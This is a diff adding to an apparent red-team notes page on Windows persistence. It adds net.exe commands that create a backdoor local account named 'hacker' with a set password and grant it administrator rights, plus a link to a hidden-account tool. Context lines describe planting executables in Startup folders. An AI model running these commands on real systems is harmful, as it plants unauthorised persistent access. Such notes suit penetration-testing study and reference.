@@ -4,6 +4,17 @@ title: Windows Persistence
 
 [[notes/mitre-attack/persistence]] on [[notes/windows/index]].
 
+# Account Creation
+
+~~~ bat
+net.exe user hacker P@ssw0rd1234 /add
+net.exe localgroup administrators hacker /add
+~~~
+
+Untested tools:
+
+- [CreateHiddenAccount](https://github.com/wgpsec/createhiddenaccount)
+
 # Startup Folder
 
 As unprivileged user write an executable or LNK file into the autostart folder at `%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\` or as local admin at `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`.
